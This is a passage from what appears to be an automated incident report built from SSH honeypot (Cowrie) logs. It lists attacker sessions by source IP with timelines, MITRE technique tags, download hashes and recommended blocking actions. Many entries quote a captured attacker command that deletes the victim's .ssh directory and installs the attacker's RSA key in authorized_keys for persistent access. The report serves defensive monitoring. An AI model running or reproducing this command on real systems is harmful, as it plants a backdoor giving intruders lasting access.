| **Last Seen** | 2026-05-23 09:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:18:45` | `cowrie.session.connect` |
| `2026-05-23 09:18:45` | `cowrie.client.version` |
| `2026-05-23 09:18:45` | `cowrie.client.kex` |
| `2026-05-23 09:18:46` | `cowrie.login.success` |
| `2026-05-23 09:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee3adc035469

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:22 |
| **Last Seen** | 2026-05-23 09:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:22:15` | `cowrie.session.connect` |
| `2026-05-23 09:22:15` | `cowrie.client.version` |
| `2026-05-23 09:22:16` | `cowrie.client.kex` |
| `2026-05-23 09:22:17` | `cowrie.login.success` |
| `2026-05-23 09:22:18` | `cowrie.session.params` |
| `2026-05-23 09:22:18` | `cowrie.command.input` |
| `2026-05-23 09:22:18` | `cowrie.command.failed` |
| `2026-05-23 09:22:18` | `cowrie.log.closed` |
| `2026-05-23 09:22:19` | `cowrie.session.params` |
| `2026-05-23 09:22:19` | `cowrie.command.input` |
| `2026-05-23 09:22:19` | `cowrie.session.file_download` |
| `2026-05-23 09:22:19` | `cowrie.log.closed` |
| `2026-05-23 09:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-628f0293b0a6

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:22 |
| **Last Seen** | 2026-05-23 09:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:22:22` | `cowrie.session.connect` |
| `2026-05-23 09:22:22` | `cowrie.client.version` |
| `2026-05-23 09:22:23` | `cowrie.client.kex` |
| `2026-05-23 09:22:24` | `cowrie.login.success` |
| `2026-05-23 09:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4331335bc961

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:26 |
| **Last Seen** | 2026-05-23 09:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:26:01` | `cowrie.session.connect` |
| `2026-05-23 09:26:01` | `cowrie.client.version` |
| `2026-05-23 09:26:01` | `cowrie.client.kex` |
| `2026-05-23 09:26:02` | `cowrie.login.success` |
| `2026-05-23 09:26:03` | `cowrie.session.params` |
| `2026-05-23 09:26:03` | `cowrie.command.input` |
| `2026-05-23 09:26:03` | `cowrie.command.failed` |
| `2026-05-23 09:26:03` | `cowrie.log.closed` |
| `2026-05-23 09:26:04` | `cowrie.session.params` |
| `2026-05-23 09:26:04` | `cowrie.command.input` |
| `2026-05-23 09:26:04` | `cowrie.session.file_download` |
| `2026-05-23 09:26:04` | `cowrie.log.closed` |
| `2026-05-23 09:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f338687a9a01

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:26 |
| **Last Seen** | 2026-05-23 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:26:08` | `cowrie.session.connect` |
| `2026-05-23 09:26:08` | `cowrie.client.version` |
| `2026-05-23 09:26:08` | `cowrie.client.kex` |
| `2026-05-23 09:26:09` | `cowrie.login.success` |
| `2026-05-23 09:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3324078f8b5d

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:33 |
| **Last Seen** | 2026-05-23 09:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:33:50` | `cowrie.session.connect` |
| `2026-05-23 09:33:50` | `cowrie.client.version` |
| `2026-05-23 09:33:50` | `cowrie.client.kex` |
| `2026-05-23 09:33:51` | `cowrie.login.success` |
| `2026-05-23 09:33:52` | `cowrie.session.params` |
| `2026-05-23 09:33:52` | `cowrie.command.input` |
| `2026-05-23 09:33:52` | `cowrie.command.failed` |
| `2026-05-23 09:33:52` | `cowrie.log.closed` |
| `2026-05-23 09:33:53` | `cowrie.session.params` |
| `2026-05-23 09:33:53` | `cowrie.command.input` |
| `2026-05-23 09:33:53` | `cowrie.session.file_download` |
| `2026-05-23 09:33:53` | `cowrie.log.closed` |
| `2026-05-23 09:33:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a85e3197a442

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:33 |
| **Last Seen** | 2026-05-23 09:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:33:56` | `cowrie.session.connect` |
| `2026-05-23 09:33:56` | `cowrie.client.version` |
| `2026-05-23 09:33:57` | `cowrie.client.kex` |
| `2026-05-23 09:33:58` | `cowrie.login.success` |
| `2026-05-23 09:33:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df805bdfa7b

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:37 |
| **Last Seen** | 2026-05-23 09:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:37:46` | `cowrie.session.connect` |
| `2026-05-23 09:37:46` | `cowrie.client.version` |
| `2026-05-23 09:37:47` | `cowrie.client.kex` |
| `2026-05-23 09:37:48` | `cowrie.login.success` |
| `2026-05-23 09:37:49` | `cowrie.session.params` |
| `2026-05-23 09:37:49` | `cowrie.command.input` |
| `2026-05-23 09:37:49` | `cowrie.command.failed` |
| `2026-05-23 09:37:49` | `cowrie.log.closed` |
| `2026-05-23 09:37:50` | `cowrie.session.params` |
| `2026-05-23 09:37:50` | `cowrie.command.input` |
| `2026-05-23 09:37:50` | `cowrie.session.file_download` |
| `2026-05-23 09:37:50` | `cowrie.log.closed` |
| `2026-05-23 09:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a8fb84f6c6

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:37 |
| **Last Seen** | 2026-05-23 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:37:53` | `cowrie.session.connect` |
| `2026-05-23 09:37:53` | `cowrie.client.version` |
| `2026-05-23 09:37:54` | `cowrie.client.kex` |
| `2026-05-23 09:37:55` | `cowrie.login.success` |
| `2026-05-23 09:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3af6226ed4a0

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:49 |
| **Last Seen** | 2026-05-23 09:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:49:19` | `cowrie.session.connect` |
| `2026-05-23 09:49:19` | `cowrie.client.version` |
| `2026-05-23 09:49:19` | `cowrie.client.kex` |
| `2026-05-23 09:49:20` | `cowrie.login.success` |
| `2026-05-23 09:49:21` | `cowrie.session.params` |
| `2026-05-23 09:49:21` | `cowrie.command.input` |
| `2026-05-23 09:49:21` | `cowrie.command.failed` |
| `2026-05-23 09:49:22` | `cowrie.log.closed` |
| `2026-05-23 09:49:22` | `cowrie.session.params` |
| `2026-05-23 09:49:22` | `cowrie.command.input` |
| `2026-05-23 09:49:22` | `cowrie.session.file_download` |
| `2026-05-23 09:49:22` | `cowrie.log.closed` |
| `2026-05-23 09:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d83f5032a93

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:49 |
| **Last Seen** | 2026-05-23 09:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:49:26` | `cowrie.session.connect` |
| `2026-05-23 09:49:26` | `cowrie.client.version` |
| `2026-05-23 09:49:26` | `cowrie.client.kex` |
| `2026-05-23 09:49:27` | `cowrie.login.success` |
| `2026-05-23 09:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec414d3909d2

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-05-23 09:51 |
| **Last Seen** | 2026-05-23 09:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:51:30` | `cowrie.session.connect` |
| `2026-05-23 09:51:30` | `cowrie.client.version` |
| `2026-05-23 09:51:30` | `cowrie.client.kex` |
| `2026-05-23 09:51:31` | `cowrie.login.success` |
| `2026-05-23 09:51:31` | `cowrie.session.params` |
| `2026-05-23 09:51:31` | `cowrie.command.input` |
| `2026-05-23 09:51:31` | `cowrie.command.failed` |
| `2026-05-23 09:51:31` | `cowrie.log.closed` |
| `2026-05-23 09:51:31` | `cowrie.session.params` |
| `2026-05-23 09:51:31` | `cowrie.command.input` |
| `2026-05-23 09:51:31` | `cowrie.session.file_download` |
| `2026-05-23 09:51:31` | `cowrie.log.closed` |
| `2026-05-23 09:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f5ffa506040

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-05-23 09:51 |
| **Last Seen** | 2026-05-23 09:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:51:33` | `cowrie.session.connect` |
| `2026-05-23 09:51:33` | `cowrie.client.version` |
| `2026-05-23 09:51:33` | `cowrie.client.kex` |
| `2026-05-23 09:51:33` | `cowrie.login.success` |
| `2026-05-23 09:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65e3f2308160

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:53 |
| **Last Seen** | 2026-05-23 09:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:53:03` | `cowrie.session.connect` |
| `2026-05-23 09:53:03` | `cowrie.client.version` |
| `2026-05-23 09:53:03` | `cowrie.client.kex` |
| `2026-05-23 09:53:04` | `cowrie.login.success` |
| `2026-05-23 09:53:05` | `cowrie.session.params` |
| `2026-05-23 09:53:05` | `cowrie.command.input` |
| `2026-05-23 09:53:05` | `cowrie.command.failed` |
| `2026-05-23 09:53:06` | `cowrie.log.closed` |
| `2026-05-23 09:53:06` | `cowrie.session.params` |
| `2026-05-23 09:53:06` | `cowrie.command.input` |
| `2026-05-23 09:53:06` | `cowrie.session.file_download` |
| `2026-05-23 09:53:06` | `cowrie.log.closed` |
| `2026-05-23 09:53:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b3a13a8313

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]105` |
| **First Seen** | 2026-05-23 09:53 |
| **Last Seen** | 2026-05-23 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:53:10` | `cowrie.session.connect` |
| `2026-05-23 09:53:10` | `cowrie.client.version` |
| `2026-05-23 09:53:10` | `cowrie.client.kex` |
| `2026-05-23 09:53:11` | `cowrie.login.success` |
| `2026-05-23 09:53:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]105` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d5329bf1e1a

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-05-23 09:55 |
| **Last Seen** | 2026-05-23 09:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:55:34` | `cowrie.session.connect` |
| `2026-05-23 09:55:34` | `cowrie.client.version` |
| `2026-05-23 09:55:35` | `cowrie.client.kex` |
| `2026-05-23 09:55:35` | `cowrie.login.success` |
| `2026-05-23 09:55:35` | `cowrie.session.params` |
| `2026-05-23 09:55:35` | `cowrie.command.input` |
| `2026-05-23 09:55:35` | `cowrie.command.failed` |
| `2026-05-23 09:55:35` | `cowrie.log.closed` |
| `2026-05-23 09:55:35` | `cowrie.session.params` |
| `2026-05-23 09:55:35` | `cowrie.command.input` |
| `2026-05-23 09:55:35` | `cowrie.session.file_download` |
| `2026-05-23 09:55:35` | `cowrie.log.closed` |
| `2026-05-23 09:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf78d054fc67

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-05-23 09:55 |
| **Last Seen** | 2026-05-23 09:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 09:55:37` | `cowrie.session.connect` |
| `2026-05-23 09:55:37` | `cowrie.client.version` |
| `2026-05-23 09:55:37` | `cowrie.client.kex` |
| `2026-05-23 09:55:37` | `cowrie.login.success` |
| `2026-05-23 09:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `180.76.170[.]111` | **16** | 2026-05-23 09:08 | 2026-05-23 09:22 | 18m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.68.83[.]105` | **14** | 2026-05-23 09:04 | 2026-05-23 09:57 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.105[.]165` | **12** | 2026-05-23 06:38 | 2026-05-23 06:48 | 7m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.194.234[.]8` | **7** | 2026-05-23 09:30 | 2026-05-23 09:55 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
